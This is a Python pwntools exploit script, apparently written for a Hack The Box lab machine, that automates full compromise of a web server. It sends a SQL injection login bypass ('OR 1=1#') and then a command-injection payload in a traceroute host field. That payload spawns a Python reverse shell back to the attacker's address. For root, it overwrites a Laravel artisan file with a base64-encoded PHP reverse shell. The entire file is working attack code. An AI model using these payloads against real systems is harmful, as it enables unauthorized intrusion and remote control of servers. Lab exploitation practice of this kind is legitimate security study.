#!/usr/bin/env python3

from pwn import *
import netifaces as ni
from base64 import b64encode
import urllib3, sys, argparse, subprocess, pty, time
urllib3.disable_warnings()
warnings.filterwarnings("ignore", category=UserWarning, module="pwntools")

try:
    ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
except ValueError:
    print("[-] You are not connected to HTB VPN")
    sys.exit(-2)

proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "https://127.0.0.1:8080"
}

def exploit(RHOST, user):
    url = f"http://admin.{RHOST}/"
    session = requests.session()
    website = session.get(url, verify=False, proxies=proxy)
    cookie = session.cookies.get_dict()
    payload = "' OR 1=1#"
    datas = {
        "username":payload,
        "password":payload
    }
    auth = session.post(url, cookies=cookie, data=datas, verify=False, allow_redirects=False, proxies=proxy)
    auth2 = session.post(url, cookies=cookie, data=datas, verify=False, proxies=proxy)
    if auth.status_code==302:
        log.info("SQL Injection is successful!")
        pass
    else:
        print("[-] Issue with the payload!")
        sys.exit(-2)
    listener=listen(0)
    port = listener.lport
    log.info("Sending the reverse shell payload to the target")
    command_payload='traceroute&host=8.8.8.8;' + f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
    datas2 = {
            'command':'traceroute',
            'host':f'8.8.8.8;{command_payload}'
    }        
    try:
        exec_website = session.post(url + 'welcome.php',data=datas2, verify=False, timeout=2,proxies=proxy) 
    except:
        print("[-] Some error with the reverse shell!")
    shell=listener.wait_for_connection()
    if user==1:
        log.info("Success!, www-data has been pwned")
        shell.interactive()
    elif user==2:
        l = listen()
        p = l.lport
        b64_encode_payload = base64.b64encode(f'<?php\n$sock = fsockopen("{ip}", {p});\nexec("/bin/bash -i <&3 >&3 2>&3");\n?>'.encode("utf-8")).decode("utf-8")
        log.info("Sending the encrypted payload and waiting for connect back!")
        shell.sendline(f"echo {b64_encode_payload} | base64 -d > /var/www/laravel/artisan".encode())
        root_connection = l.wait_for_connection()
        shell.sendline("chmod +x /var/www/laravel/artisan".encode())
        root_connection = l.wait_for_connection()
        root_connection.interactive()
    else:
        print("[-] Entered option is incorrect!")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-rht', '--RHOST', required=True, help="Enter the target IP Address")
    argv = parser.parse_args()
    RHOST = argv.RHOST
    RHOST = RHOST.strip()
    log.info("Checking if the host is up or not")
    response = subprocess.run(["ping", "-c", "3", RHOST], capture_output=True)
    if response.returncode == 0:
        log.info("The machine is up and running")
    else:
        print("[-] The machine is down or not started")
        sys.exit(-2)
    print('''
    1. www-data
    2. Root
    ''')
    user = input("[+] Enter the user you want to pwn : ")
    user = int(user.strip())
    if user in [1, 2]:
        exploit(RHOST, user)
    else:
        print("[-] Invalid Options!")


if __name__ == "__main__":
    main()